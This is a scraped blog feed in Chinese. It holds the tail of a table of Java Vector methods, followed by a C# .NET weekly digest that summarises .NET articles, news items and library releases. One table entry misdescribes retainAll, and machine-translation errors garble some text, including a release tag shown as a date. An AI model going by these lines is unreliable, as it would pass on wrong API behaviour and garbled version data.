indexOf(Object elem, int index)</td>\n<td style=\"text-align: left;\">搜索给定参数的第一个匹配项，从 index 处开始搜索，并使用 equals()函数测试其相等性</td>\n</tr>\n<tr>\n<td style=\"text-align: left;\">void insertElementAt(E obj, int index)</td>\n<td style=\"text-align: left;\">将指定对象作为此Vector中的元素插入到指定的 索引位置</td>\n</tr>\n<tr>\n<td style=\"text-align: left;\">boolean isEmpty()</td>\n<td style=\"text-align: left;\">测试此Vector中的是否不包含任何元素</td>\n</tr>\n<tr>\n<td style=\"text-align: left;\">E lastElement()</td>\n<td style=\"text-align: left;\">返回此Vector的最后一个元素（位于Object[]数组索引 Object[].length-1 处的元素）</td>\n</tr>\n<tr>\n<td style=\"text-align: left;\">int lastIndexOf(Object elem)</td>\n<td style=\"text-align: left;\">返回指定的对象在此Vector中最后一个匹配项的索引</td>\n</tr>\n<tr>\n<td style=\"text-align: left;\">int lastIndexOf(Object elem, int index)</td>\n<td style=\"text-align: left;\">从指定的索引处开始向后搜索指定的对象，并返回搜索到的最后一个索引</td>\n</tr>\n<tr>\n<td style=\"text-align: left;\">E remove(int index)</td>\n<td style=\"text-align: left;\">移除此Vector中指定索引位置的元素</td>\n</tr>\n<tr>\n<td style=\"text-align: left;\">boolean remove(Object o)</td>\n<td style=\"text-align: left;\">移除此Vector中指定元素的第一个匹配项，如果此Vector不包含该元素，则所有元素保持不变，并返回false</td>\n</tr>\n<tr>\n<td style=\"text-align: left;\">boolean removeAll(Collection&lt;?&gt; c)</td>\n<td style=\"text-align: left;\">从此Vector中移除包含在指定 Collection 中的所有元素</td>\n</tr>\n<tr>\n<td style=\"text-align: left;\">void removeAllElements()</td>\n<td style=\"text-align: left;\">从此Vector中移除全部元素，并设置elementCount=0（该变量表示此Vector对象中有效元素的数量），Object[]数组的长度不变。</td>\n</tr>\n<tr>\n<td style=\"text-align: left;\">void removeElementAt(int index)</td>\n<td style=\"text-align: left;\">删除指定索引处的元素</td>\n</tr>\n<tr>\n<td style=\"text-align: left;\">protected void removeRange(int fromIndex, int toIndex)</td>\n<td style=\"text-align: left;\">从此 Vector 中移除索引位于 [fromIndex, toIndex)（左闭右开）之间的所有元素</td>\n</tr>\n<tr>\n<td style=\"text-align: left;\">boolean retainAll(Collection&lt;?&gt; c)</td>\n<td style=\"text-align: left;\">如果此Vector中包含指定 Collection 中的所有元素，此函数返回true</td>\n</tr>\n<tr>\n<td style=\"text-align: left;\">E set(int index, E element)</td>\n<td style=\"text-align: left;\">用指定的元素替换此Vector中指定索引处的元素</td>\n</tr>\n<tr>\n<td style=\"text-align: left;\">void setElementAt(E obj, int index)</td>\n<td style=\"text-align: left;\">将此Vector指定 索引处的元素设置为指定的另一个元素</td>\n</tr>\n<tr>\n<td style=\"text-align: left;\">void setSize(int newSize)</td>\n<td style=\"text-align: left;\">设置此Vector的大小</td>\n</tr>\n<tr>\n<td style=\"text-align: left;\">int size()</td>\n<td style=\"text-align: left;\">返回此Vector中的元素数</td>\n</tr>\n<tr>\n<td style=\"text-align: left;\">List subList(int fromIndex, int toIndex)</td>\n<td style=\"text-align: left;\">返回此 Vector的子集，该子集的元素范围为 [fromIndex, toIndex)（左闭右开）索引位置的所有元素</td>\n</tr>\n<tr>\n<td style=\"text-align: left;\">Object[] toArray()</td>\n<td style=\"text-align: left;\">返回一个Object[]数组，包含此Vector中以正确顺序存放的所有元素</td>\n</tr>\n<tr>\n<td style=\"text-align: left;\">String toString()</td>\n<td style=\"text-align: left;\">返回此Vector的字符串表示形式，其中包含每个元素的 String 表示形式</td>\n</tr>\n</tbody>\n</table>\n\n\n</div>\n<div class=\"clear\"></div>\n\n            </div>\n            <div class=\"postDesc\">posted @ \n<span id=\"post-date\">2026-02-15 22:25</span>&nbsp;\n<a href=\"https://www.cnblogs.com/Carey-ccl\">Carey_ccl</a>&nbsp;\n阅读(<span id=\"post_view_count\">46</span>)&nbsp;\n评论(<span id=\"post_comment_count\">1</span>)&nbsp;\n&nbsp;\n<a href=\"\">收藏</a>&nbsp;\n<a href=\"\">举报</a>\n</div>"
    },
    {
      "title": "C# .NET 周刊｜2026年1月3期",
      "link": "https://www.cnblogs.com/InCerry/p/-/dotnet_week_26_1_3",
      "published": "",
      "description": "<h1 class=\"postTitle\">\n                <a class=\"postTitle2 vertical-middle\" href=\"https://www.cnblogs.com/InCerry/p/-/dotnet_week_26_1_3\" id=\"cb_post_title_url\" title=\"发布于 2026-02-15 20:36\">\n    <span>C# .NET 周刊｜2026年1月3期</span>\n    \n\n</a>\n\n            </h1>\n            <div class=\"clear\"></div>\n            <div class=\"postBody\">\n                <div class=\"blogpost-body cnblogs-markdown\" id=\"cnblogs_post_body\">\n<h2 id=\"国内文章\">国内文章</h2>\n<h3 id=\"不服跑个分net-10-大整数计算对阵-java结果令人意外\">不服跑个分？.NET 10 大整数计算对阵 Java，结果令人意外</h3>\n<p><a href=\"https://www.cnblogs.com/sdcb/p/19484525/20261113-big-integer-dotnet-10-vs-java\" target=\"_blank\">https://www.cnblogs.com/sdcb/p/19484525/20261113-big-integer-dotnet-10-vs-java</a></p>\n<p>本文通过对比.NET 的 System.Numerics.BigInteger 和 Java 的 java.math.BigInteger，从性能角度深入分析大数运算的速度。作者探讨了在高精度计算和密码学场景下，两者的表现差异。实验涵盖了加法、乘法和模幂的运算，使用相同开发环境，并严格控制测试变量。文章指出.NET 的 BigInteger 在不可变特性下的公平性，探讨了其性能表现的原因，并附带代码示例。整体内容深入且富有思考，对开发者有实用价值。</p>\n<h3 id=\"一个高性能的-net-mqtt-客户端与服务器库\">一个高性能的 .NET MQTT 客户端与服务器库</h3>\n<p><a href=\"https://www.cnblogs.com/dotnet-org-cn/p/19473369\" target=\"_blank\">https://www.cnblogs.com/dotnet-org-cn/p/19473369</a></p>\n<p>这篇文章介绍了一个高性能的 MQTT 库，完全用 C#实现。它支持 MQTT 3.1.1 和 MQTT 5.0 协议，具备 Broker 桥接和集群功能。库的核心特性包括高性能异步实现、内存管理先进技术和支持 10,000+ 并发连接。文章深入探讨了内存管理技术如 Span、Memory等，以减少内存压力，并使用 async/await 优化 I/O 操作。适配.NET 6.0、8.0 和 10.0 版本，具有极佳的性能和实用性。文中还强调了库的灵活性与企业级特性，是物联网领域的重要工具。</p>\n<h3 id=\"2025-总结篇忙碌的日子里越过-35-岁开启下一个征程\">2025 总结篇，忙碌的日子里越过 35 岁，开启下一个征程</h3>\n<p><a href=\"https://www.cnblogs.com/SunSpring/p/19469874\" target=\"_blank\">https://www.cnblogs.com/SunSpring/p/19469874</a></p>\n<p>文章讲述了作者在 2024 年工作中的转变与挑战。由于部门重组，作者成为技术负责人，面临管理和开发双重任务。重新学习.NET 5+，并在 Java 系统中进行重构，实施微服务架构，使用 Spring Cloud 和 Nacos 等技术，解决系统复杂性与维护问题。实施项目管理工具提升团队效率，经过一年的努力，成功上线新系统并持续优化。作者从中获得了丰富的技术经验和管理心得，对过去经验有了新的认知。</p>\n<h3 id=\"让-winformnet-再次伟大一个专门设计用于帮助-winforms-应用程序迁移到-blazor-wasm-平台的项目\">让 WinForm.NET 再次伟大！一个专门设计用于帮助 WinForms 应用程序迁移到 Blazor WASM 平台的项目</h3>\n<p><a href=\"https://www.cnblogs.com/Can-daydayup/p/19470057\" target=\"_blank\">https://www.cnblogs.com/Can-daydayup/p/19470057</a></p>\n<p>本文讨论了 MWGA 项目，该项目旨在帮助传统 WinForms 应用程序有效迁移至 Blazor WebAssembly(WASM)平台。结合 Blazor 的跨平台特性，MWGA 能够将使用 GDI+ 的应用程序修改量控制在 10% 以内，降低了现代化成本与风险。文章介绍了 WinForms 的背景和实际应用场景，说明了云集成和跨平台访问的需求。作者分享了演示项目的效果，并确认通过 MWGA 迁移后的代码在不同环境下运行逻辑一致。这一项目为企业现代化转型带来了希望，尽管仍需完善。</p>\n<h3 id=\"dbshadow-横空出世dappernet-的天花板盖不住了\">DBShadow 横空出世,Dapper.net 的天花板盖不住了</h3>\n<p><a href=\"https://www.cnblogs.com/xiangji/p/19485861\" target=\"_blank\">https://www.cnblogs.com/xiangji/p/19485861</a></p>\n<p>DBShadow 是一个高性能的.NET 开源 ORM，利用 ShadowSql 和 PocoEmit.Mapper 高效处理 SQL 拼接和映射。与 Dapper 对比，DBShadow 在速度和内存占用上表现更佳。在.NET 8 环境下，DBShadow 比 Dapper 快 10%，并且支持.NET 10，而 Dapper 不支持。使用 BenchmarkDotNet 进行的对比显示，DBShadow 在多种数据库(如 SQLite 和 MySQL)上均优于 Dapper。此文章详细介绍了两者代码实现和性能比较，为开发者提供了实用的参考和数据支持。</p>\n<h3 id=\"原创c开源一分钟使用-picoserver-打造日志服务器\">(原创)[C#]【开源】一分钟使用 PicoServer 打造日志服务器</h3>\n<p><a href=\"https://www.cnblogs.com/lesliexin/p/19475073\" target=\"_blank\">https://www.cnblogs.com/lesliexin/p/19475073</a></p>\n<p>本文介绍了 PicoServer 的使用，适合快速开发 WebAPI 原型。读者可以通过开源项目学习如何搭建日志服务器。文章简洁明了，提供了操作步骤，包括引用 NuGet 包、设计界面和使用说明。PicoServer 简单易用，且体积小，适合特定业务需求。作者强调其轻量级特性，相比 Asp.Net Core 更为便利。适合希望快速实现接口的开发者。</p>\n<h3 id=\"总结归纳net-10-中-minimal-apis-主要应用场景\">总结归纳.NET 10 中 Minimal APIs 主要应用场景</h3>\n<p><a href=\"https://www.cnblogs.com/tianqing/p/19467531\" target=\"_blank\">https://www.cnblogs.com/tianqing/p/19467531</a></p>\n<p>本文探讨了.NET 10 中的 Minimal APIs，主要应用场景包括高并发读接口、业务能力型 API 和平台级 API 模块化。Minimal APIs 在.NET 6 至 8 中实现了基础功能，并在.NET 9 至 10 中进一步强化，可维护性、可治理性、可扩展性和可工程化性显著提升。其中，Typed Results 消除了返回的模糊性，提高了 OpenAPI 文档的精确度。它还优化了中间件组合能力以及与依赖注入、验证和授权的整合，使得 API 的分层和模块化成为可能，推动企业级 API 的有效构建。</p>\n<h3 id=\"跨越技术鸿沟aspire-赋能-javascript-与-nodejs-开发者的深度生态融合\">跨越技术鸿沟：Aspire 赋能 JavaScript 与 Node.js 开发者的深度生态融合</h3>\n<p><a href=\"https://www.cnblogs.com/shanyou/p/19474912\" target=\"_blank\">https://www.cnblogs.com/shanyou/p/19474912</a></p>\n<p>本文探讨.NET Aspire 13.0 如何支持 JavaScript 与 Node.js 开发者，通过标准化基础设施解决传统开发中的摩擦。Aspire 引入代码化编排、全链路可观测性及标准化服务发现，简化前后端与微服务的整合。开发者不再需手动处理复杂配置与依赖关系，减少认知负担与操作复杂性。此文详细介绍了现代化 AddJavaScriptApp 的架构演进，并对生产部署与云原生对接提出建议，强调 Aspire 对于多语言生态的价值。整体提升了跨技术栈的开发效率。</p>\n<h3 id=\"wpf-使用-hlsl--clip-实现高亮歌词光照效果\">WPF 使用 HLSL + Clip 实现高亮歌词光照效果</h3>\n<p><a href=\"https://www.cnblogs.com/TwilightLemon/p/19497125\" target=\"_blank\">https://www.cnblogs.com/TwilightLemon/p/19497125</a></p>\n<p>本文讨论了使用 HLSL 编写文本高亮着色器，以增强歌词显示效果。作者受到 WPF 阳光效果的启发，探索了几种高亮实现方法，最终采用将着色器封装为用户控件的方案。文章介绍了可能遇到的问题，例如文本像素化和性能低下。此外，提供了高亮颜色自定义、宽度调整和模式切换的功能。作者展示了完整的 HLSL 代码及其参数作用，说明了光照强度与文本颜色的混合计算过程。这种方法显著提升了文本的光感效果。</p>\n<h3 id=\"并发并行与异步\">并发，并行与异步</h3>\n<p><a href=\"https://www.cnblogs.com/kklldog/p/19474533\" target=\"_blank\">https://www.cnblogs.com/kklldog/p/19474533</a></p>\n<p>本文深入剖析了并发、并行和异步三个核心概念，澄清了它们之间的区别。并发是一种处理多个任务的能力，强调任务的交替执行。并行则是真正意义上同一时间执行多个任务，依赖多核 CPU。异步是一种非阻塞的编程模型，主要用于 I/O 操作，避免浪费线程资源。文章通过实际例子和理论支持，使读者清楚理解这三者的定义和应用，指出异步并不等同于并发，同时强调了性能优化的重要性。整体内容结构清晰，便于读者理解。</p>\n<h3 id=\"pythoncsharpgonextjs不同框架的性能到底差多少\">Python、CSharp、Go、Nextjs，不同框架的性能到底差多少？</h3>\n<p><a href=\"https://www.cnblogs.com/deali/p/19498429\" target=\"_blank\">https://www.cnblogs.com/deali/p/19498429</a></p>\n<p>本文对不同框架和语言的性能进行了对比测试，特别关注了 ASP.NET Core 8.0 和 9.0 的性能表现。测试发现，ASP.NET Core 9.0 在吞吐量和内存使用方面表现卓越，适合高性能微服务。Go + Gin 虽然轻量，但吞吐量表现一般，适合小型服务。Next.js 在高并发场景下表现不佳。总体来看，ASP.NET Core 9.0 是未来项目的最佳选择，而传统 MVC 架构则显得过于臃肿，未来不推荐使用。</p>\n<h3 id=\"告别屎山代码gearnet专为-net-工业自动化打造的微编排框架\">告别“屎山”代码！Gear.NET：专为 .NET 工业自动化打造的微编排框架</h3>\n<p><a href=\"https://www.cnblogs.com/egreen/p/19498375\" target=\"_blank\">https://www.cnblogs.com/egreen/p/19498375</a></p>\n<p>Gear.NET 是一个专为 .NET 工业自动化设计的微编排框架，旨在解决工业软件开发中的痛点，如逻辑复杂、硬件耦合、数据丢失等问题。它采用洋葱架构，提供 MicroWorkflow 微流程引擎，支持优雅的流程编排和异步操作。此外，UniversalScpi 配置驱动解决了硬件更换时的代码重构问题，通过 JSON 配置驱动不同的标准 SCPI 仪器。相比以往，Gear.NET 提供了深度封装的 SqlSugar 存储解决方案，确保数据的安全性与可分析性，极大地提高了兼容性和可维护性，适合工业软件需求。整体上，Gear.NET 旨在简化开发过程、提高代码质量。</p>\n<h3 id=\"c实现包裹扣面单的几种方式\">c#实现包裹扣面单的几种方式</h3>\n<p><a href=\"https://www.cnblogs.com/axing/p/19483856\" target=\"_blank\">https://www.cnblogs.com/axing/p/19483856</a></p>\n<p>本文探讨了包裹流转过程中面单扣取的实现方案，包括使用 OpenCVSharp 进行轮廓、颜色和边缘检测，及 OCR 识别面单内容。文章重点介绍了 OpenCVSharp 在包裹和面单色差明显情况下的有效性，尽管在色差不明显时效果较差。提供了核心代码，展示了检测与处理过程，包括检测耗时和面单区域的信息。文中提到使用 YOLO 和 Labelme 可以训练模型以定位面单，为未来探讨做好铺垫。</p>\n<h3 id=\"cnetnet-core-技术前沿周刊--第-65-期2026-年-11-111\">C#/.NET/.NET Core 技术前沿周刊 | 第 65 期(2026 年 1.1-1.11)</h3>\n<p><a href=\"https://www.cnblogs.com/Can-daydayup/p/19479370\" target=\"_blank\">https://www.cnblogs.com/Can-daydayup/p/19479370</a></p>\n<p>本文介绍了 C#/.NET/.NET Core 技术前沿的最新动态和实用资源。报道了 C#在 2025 年的 TIOBE 编程语言排名中再次获评、生成式人工智能的崛起及其与 C#的结合、以及 MongoDB EF Core 的可查询加密特性。此外，还推广了优质项目和迁移 WinForms 到 Blazor 的 MWGA 项目。这些内容为开发者提供了有价值的信息与资源，有助于他们掌握技术前沿动态。</p>\n<h3 id=\"译ai-是如何解决我的拖延症的\">【译】AI 是如何解决我的拖延症的</h3>\n<p><a href=\"https://www.cnblogs.com/MeteorSeed/p/19482001\" target=\"_blank\">https://www.cnblogs.com/MeteorSeed/p/19482001</a></p>\n<p>作者分享了使用 Visual Studio 和 Copilot 完成两个项目的经历，强调了克服拖延和高效开发的重要性。第一个项目是将其书籍《The Automated Home》转换为静态网站，虽然需要微调设计，但效率显著提高。第二个项目是开发一个简易编程语言 TOON 的解析器，利用 Copilot 和云智能体协助解决复杂的语法分析问题。作者鼓励读者利用闲暇时间启动拖延已久的项目。</p>\n<h3 id=\"开源自荐为-ai-短视频打造一个分镜管理平台\">【开源自荐】为 AI 短视频打造一个分镜管理平台</h3>\n<p><a href=\"https://www.cnblogs.com/Z7TS/p/19483978\" target=\"_blank\">https://www.cnblogs.com/Z7TS/p/19483978</a></p>\n<p>这篇文章讲述了作者在 2022 至 2026 年间，如何利用 AI 技术开发本地客户端项目 Storyboard，旨在为短视频创作者提供镜头管理功能。作者分享了开发过程中的感受，包括使用的工具和技术栈，遇到的管理混乱问题，以及通过 AI 提升视频制作效率的体验。文章描述了项目需求的整理和核心功能的实现，涵盖了视频导入、分镜生成、批量任务处理等功能，展现了 AI 在短视频领域的应用潜力。</p>\n<h3 id=\"如何一步步将-aspnet-mvc-升级为net\">如何一步步将 ASP.NET MVC 升级为.NET</h3>\n<p><a href=\"https://www.cnblogs.com/powertoolsteam/p/19486260\" target=\"_blank\">https://www.cnblogs.com/powertoolsteam/p/19486260</a></p>\n<p>将 ASP.NET MVC 应用从.NET Framework 迁移到现代.NET 需要考虑多个方面。该过程并非简单的版本提升，需关注多个架构和配置的变化。文中提供了实用的逐步策略，包括根据应用大小选择迁移路径、识别阻碍因素、建立安全基线、优先升级库及考虑迁移工具等步骤。这些步骤旨在帮助开发者有效降低风险，确保迁移顺利进行。文中还强调了 Microsoft 提供的工具和指导，以便进行兼容性检查和补救措施。此文适合有实际开发经验的开发者参考。</p>\n<h3 id=\"c-14-中的新增功能\">C# 14 中的新增功能</h3>\n<p><a href=\"https://www.cnblogs.com/net-kevin-li/p/19476883\" target=\"_blank\">https://www.cnblogs.com/net-kevin-li/p/19476883</a></p>\n<p>C# 14 引入重要更新，包括扩展成员、空条件赋值、支持未绑定泛型的 nameof、Span隐式转换、简单 lambda 参数修饰符、字段支持属性、partial 事件与构造函数、用户定义复合赋值运算符和基于文件的预处理器指令。开发环境要求.NET 10 SDK 或 Visual Studio 2026。某些功能需要开启编译器开关以启用。性能优化方面，Span隐式转换减少内存拷贝，适用于高性能场景。</p>\n<h3 id=\"wpf-新手村教程二---铁匠铺攻略如何给隔壁张铁匠带两块铁依赖属性\">WPF 新手村教程(二) - 铁匠铺攻略：如何给隔壁张铁匠带两块铁(依赖属性)</h3>\n<p><a href=\"https://www.cnblogs.com/leaf-7-scouts/p/19475414\" target=\"_blank\">https://www.cnblogs.com/leaf-7-scouts/p/19475414</a></p>\n<p>本文章探讨 WPF 中的依赖属性和附加属性。依赖属性是由 WPF 属性系统统一管理的，值由多种输入源计算得出。文章通过 C#普通属性与 WPF 依赖属性的对比，阐述了依赖属性的定义和实现方式。介绍了依赖属性标识符的重要性及其在 WPF 属性系统中的应用。通过示例代码，展示了如何定义和使用依赖属性，增强了对属性体系的理解。整体内容清晰，技术深度适中，具备实用价值。</p>\n<h3 id=\"netcorekevin-是一个基于net9-ai-时代的-saas-企业级-ai-架构专注于-ai-智能体开发与集成agentframework-和知识库为企业提供高效的-ai-应用开发框架\">NetCoreKevin 是一个基于.NET9 AI 时代的 SaaS 企业级 AI 架构，专注于 AI 智能体开发与集成,AgentFramework 和知识库，为企业提供高效的 AI 应用开发框架。</h3>\n<p><a href=\"https://www.cnblogs.com/net-kevin-li/p/19493371\" target=\"_blank\">https://www.cnblogs.com/net-kevin-li/p/19493371</a></p>\n<p>NetCoreKevin 是基于 .NET 的现代化 SaaS 企业级架构，专注 AI 智能体开发与集成。采用前后端分离设计，支持 AI 语义内核和 RAG 检索增强生成，提供高效的应用开发框架。核心组件包括模块化智能体框架、动态知识库与容器化部署。后端使用 .NET Core 9、Entity Framework Core，前端采用 Vue3。支持 Docker 和 Kubernetes，实现云原生架构，满足高并发需求。该架构降低企业 AI 实施门槛，助力智能化转型。</p>\n<h3 id=\"如何通过-c-将-ppt-文档转换为-pdf-格式\">如何通过 C# 将 PPT 文档转换为 PDF 格式</h3>\n<p><a href=\"https://www.cnblogs.com/jazz-z/p/19486170\" target=\"_blank\">https://www.cnblogs.com/jazz-z/p/19486170</a></p>\n<p>本文介绍如何使用 .NET 组件 Spire.Presentation 将 PowerPoint 文件转换为 PDF。首先，用户需通过 NuGet 安装该库。示例代码展示如何处理单个和批量 PPT 转 PDF 的流程，包括文件路径的定义、加载 PPT 文档、执行转换和资源释放等步骤。文章强调了异常处理的重要性，确保用户在遇到错误时能够清楚地获取反馈。该技术在开发和办公场景中具有很高的实用价值。</p>\n<h3 id=\"译使用-visual-studio-2026-简化您的-git-工作流程\">【译】使用 Visual Studio 2026 简化您的 Git 工作流程</h3>\n<p><a href=\"https://www.cnblogs.com/MeteorSeed/p/19460575\" target=\"_blank\">https://www.cnblogs.com/MeteorSeed/p/19460575</a></p>\n<p>本文讲述了 .NET 开发者如何使用 Visual Studio 和 Git 工具高效处理日常任务。通过具体示例，作者展示了如何创建分支、暂存未完成的变更并同步，保持代码库整洁。Visual Studio 的功能优化简化了分支切换和代码审查过程，提升了工作效率。文中还提到 Copilot 的代码审查功能，如何帮助开发者检测问题并获得建议，确保提交的安全性和质量。最后，作者介绍了创建拉取请求的简易流程，强调了团队协作的重要性。</p>\n<h3 id=\"基于net-和-c构建光伏-iot-物模型方案\">基于.NET 和 C#构建光伏 IoT 物模型方案</h3>\n<p><a href=\"https://www.cnblogs.com/tianqing/p/19490649\" target=\"_blank\">https://www.cnblogs.com/tianqing/p/19490649</a></p>\n<p>文章详细描述了国内光伏设备及华为逆变器的 Modbus TCP 通讯报文。它包括请求和响应的结构、数据解析及光伏设备物模型的组织。文章目标在于解耦协议、解析与物模型，方便后续多品牌适配器的配置化映射。提供了示例代码，展示 Modbus 请求报文构造和响应解析方法，具有较高的技术深度与实用性。内容清晰，结构合理，代码示例易于理解，具备创新性，并紧跟技术进展。引用情况适中，整体可读性良好。</p>\n<h3 id=\"net-aspire-概述\">.NET Aspire 概述</h3>\n<p><a href=\"https://www.cnblogs.com/powertoolsteam/p/19477015\" target=\"_blank\">https://www.cnblogs.com/powertoolsteam/p/19477015</a></p>\n<p>.NET Aspire 是微软在 Build 2024 推出的开源框架，旨在简化.NET 8 及以上版本的分布式云原生应用开发。它提供工具、模板和最佳实践，帮助开发者将重心从基础设施转向业务逻辑。Aspire 的核心功能包括 AppHost 中心编排、服务默认配置、快速设置模板及开发者仪表盘，支持灵活部署到多种容器平台。Aspire 通过抽象化基础设施，降低开发复杂性，提高开发效率，确保环境一致性并内置可观测性和弹性。</p>\n<h3 id=\"一款专为-winui-xaml-设计的快速原型设计工具生成的代码可轻松复制到-visual-studio-中\">一款专为 WinUI XAML 设计的快速原型设计工具，生成的代码可轻松复制到 Visual Studio 中！</h3>\n<p><a href=\"https://www.cnblogs.com/Can-daydayup/p/19494169\" target=\"_blank\">https://www.cnblogs.com/Can-daydayup/p/19494169</a></p>\n<p>XAML Studio 是专为 WinUI XAML 设计的快速原型工具，支持实时预览和互动，允许将生成的代码轻松复制到 Visual Studio。它提供界面调试、数据上下文编辑器和智能感知等功能，适合开发者学习和快速原型设计。WinUI 是一个现代 UI 框架，旨在构建动态和高性能的 Windows 应用。该项目为开源，开发者可以访问 GitHub 获取源代码，并关注 C#/.NET 的最佳实践。</p>\n<h3 id=\"基于-netcorepal-cloud-framework-的-ddd-架构管理系统实践\">基于 NetCorePal Cloud Framework 的 DDD 架构管理系统实践</h3>\n<p><a href=\"https://www.cnblogs.com/aishangyipiyema/p/19499381\" target=\"_blank\">https://www.cnblogs.com/aishangyipiyema/p/19499381</a></p>\n<p>本文介绍了基于 NetCorePal Cloud Framework 构建 DDD 架构的管理系统实践。项目采用了.NET 10 和 Vue 3，实现前后端分离。系统包含用户、角色、部门等基本功能，后端使用 EF Core 进行数据访问，FastEndpoints 替代传统 Controller，并通过 MediatR 实现 CQRS 模式，存储支持 MySQL 等数据库，集成 RabbitMQ、Redis 及云原生基础设施管理。项目采用经典三层架构，强调领域驱动设计(DDD)，确保领域层与基础设施层和表现层之间的单向依赖。文章提供了清晰的架构和技术选型参考，适合相关领域开发者学习。</p>\n<h2 id=\"话题\">话题</h2>\n<h3 id=\"net-和-net-framework-2026-年-1-月服务发布更新---net-博客\">.NET 和 .NET Framework 2026 年 1 月服务发布更新 - .NET 博客</h3>\n<p><a href=\"https://devblogs.microsoft.com/dotnet/dotnet-and-dotnet-framework-january-2026-servicing-updates/\" rel=\"noopener nofollow\" target=\"_blank\">https://devblogs.microsoft.com/dotnet/dotnet-and-dotnet-framework-january-2026-servicing-updates/</a></p>\n<p>关于 2026 年 1 月发布的.NET 和.NET Framework 服务。</p>\n<p>.NET 10、9 和 8 版本发布时，增加了非安全稳定性的改进和各种漏洞修复。 NET Framework。</p>\n<h3 id=\"aws-lambda-新增对-net-10---aws-的支持\">AWS Lambda 新增对 .NET 10 - AWS 的支持</h3>\n<p><a href=\"https://aws.amazon.com/jp/about-aws/whats-new/2026/01/aws-lambda-dot-net-10/\" rel=\"noopener nofollow\" target=\"_blank\">https://aws.amazon.com/jp/about-aws/whats-new/2026/01/aws-lambda-dot-net-10/</a></p>\n<p>AWS Lambda 现已支持 .NET 10。</p>\n<p>.NET 10 文件类应用、Lambda 管理实例以及 AWS Lambda 的 Powertools 也被支持以配合 .NET 10。 NET 10 运行时在所有地区均可用。</p>\n<h3 id=\"我们如何同步-net-的虚拟单点---net-博客\">我们如何同步。 NET 的虚拟单点 - .NET 博客</h3>\n<p><a href=\"https://devblogs.microsoft.com/dotnet/how-we-synchronize-dotnets-virtual-monorepo/\" rel=\"noopener nofollow\" target=\"_blank\">https://devblogs.microsoft.com/dotnet/how-we-synchronize-dotnets-virtual-monorepo/</a></p>\n<p>如何同步一个.NET 虚拟单仓库(<a href=\"https://github.com/dotnet/dotnet\" rel=\"noopener nofollow\" target=\"_blank\">dotnet/dotnet</a>))。</p>\n<p>在作一个将多个仓库(如 dotnet/runtime 和 dotnet/aspnetcore)视为构建源的仓库(VMR)时，本书详细解释了仓库间的同步问题及其解决方法。</p>\n<h2 id=\"发布\">发布</h2>\n<ul>\n<li><a href=\"https://github.com/AvaloniaUI/Avalonia\" rel=\"noopener nofollow\" target=\"_blank\">AvaloniaUI/Avalonia</a>\n<ul>\n<li><a href=\"https://github.com/AvaloniaUI/Avalonia/releases/tag/11.3.11%20%E5%B9%B4\" rel=\"noopener nofollow\" target=\"_blank\">2011 年 3 月 11 日</a></li>\n</ul>\n</li>\n<li><a href=\"https://github.com/aws/aws-sdk-net\" rel=\"noopener nofollow\" target=\"_blank\">aws/aws-sdk-net</a>\n<ul>\n<li><a href=\"https://github.com/aws/aws-sdk-net/releases/tag/3.7.1199.0\" rel=\"noopener nofollow\" target=\"_blank\">3.7.1199.0</a>，<a href=\"https://github.com/aws/aws-sdk-net/releases/tag/3.7.1200.0\" rel=\"noopener nofollow\" target=\"_blank\">3.7.1200.0</a>，<a href=\"https://github.com/aws/aws-sdk-net/releases/tag/3.7.1201.0\" rel=\"noopener nofollow\" target=\"_blank\">3.7.1201。 0</a>， <a href=\"https://github.com/aws/aws-sdk-net/releases/tag/3.7.1202.0\" rel=\"noopener nofollow\" target=\"_blank\">3.7.1202.0</a>， <a href=\"https://github.com/aws/aws-sdk-net/releases/tag/3.7.1203.0\" rel=\"noopener nofollow\" target=\"_blank\">3.7.1203. 0</a>， <a href=\"https://github.com/aws/aws-sdk-net/releases/tag/4.0.167.0\" rel=\"noopener nofollow\" target=\"_blank\">4.0.167.0</a>， <a href=\"https://github.com/aws/aws-sdk-net/releases/tag/4.0.168.0\" rel=\"noopener nofollow\" target=\"_blank\">4.0.168.0</a>， <a href=\"https://github.com/aws/aws-sdk-net/releases/tag/4.0.169.0\" rel=\"noopener nofollow\" target=\"_blank\">4.0.169.0</a>， <a href=\"https://github.com/aws/aws-sdk-net/releases/tag/4.0.170.0\" rel=\"noopener nofollow\" target=\"_blank\">4.0.170.0</a>， <a href=\"https://github.com/aws/aws-sdk-net/releases/tag/4.0.171.0\" rel=\"noopener nofollow\" target=\"_blank\">4.0.171.0</a></li>\n</ul>\n</li>\n<li><a href=\"https://github.com/Azure/azure-sdk-for-net\" rel=\"noopener nofollow\" target=\"_blank\">Azure/azure-sdk-for-net</a>\n<ul>\n<li><a href=\"https://github.com/Azure/azure-sdk-for-net/releases/tag/Azure.Storage.Blobs_12.27.0\" rel=\"noopener nofollow\" target=\"_blank\">Azure.Storage.Blobs_12.27.0</a>，<a href=\"https://github.com/Azure/azure-sdk-for-net/releases/tag/Azure.Storage.Blobs.Batch_12.24.0\" rel=\"noopener nofollow\" target=\"_blank\">Azure.Storage.Blobs.Batch_12.24。 0</a>，<a href=\"https://github.com/Azure/azure-sdk-for-net/releases/tag/Azure.Storage.Common_12.26.0\" rel=\"noopener nofollow\" target=\"_blank\">Azure.Storage.Common_12.26。 0</a>，<a href=\"https://github.com/Azure/azure-sdk-for-net/releases/tag/Azure.Storage.Files.DataLake_12.25.0\" rel=\"noopener nofollow\" target=\"_blank\">Azure.Storage.Files.DataLake_12.25。 0</a>，<a href=\"https://github.com/Azure/azure-sdk-for-net/releases/tag/Azure.Storage.Files.Shares_12.25.0\" rel=\"noopener nofollow\" target=\"_blank\">Azure.Storage.Files.Shares_12.25。 0</a>，<a href=\"https://github.com/Azure/azure-sdk-for-net/releases/tag/Azure.Storage.Queues_12.25.0\" rel=\"noopener nofollow\" target=\"_blank\">Azure.Storage.Queues_12.25。 0</a></li>\n</ul>\n</li>\n<li><a href=\"https://github.com/CommunityToolkit/Aspire\" rel=\"noopener nofollow\" target=\"_blank\">CommunityToolkit/Aspire</a>\n<ul>\n<li><a href=\"https://github.com/CommunityToolkit/Aspire/releases/tag/v13.1.0\" rel=\"noopener nofollow\" target=\"_blank\">v13.1.0</a></li>\n</ul>\n</li>\n<li><a href=\"https://github.com/DataDog/dd-trace-dotnet\" rel=\"noopener nofollow\" target=\"_blank\">DataDog/dd-trace-dotnet</a>\n<ul>\n<li><a href=\"https://github.com/DataDog/dd-trace-dotnet/releases/tag/v3.35.0\" rel=\"noopener nofollow\" target=\"_blank\">v3.35.0</a></li>\n</ul>\n</li>\n<li><a href=\"https://github.com/dotnet/maui\" rel=\"noopener nofollow\" 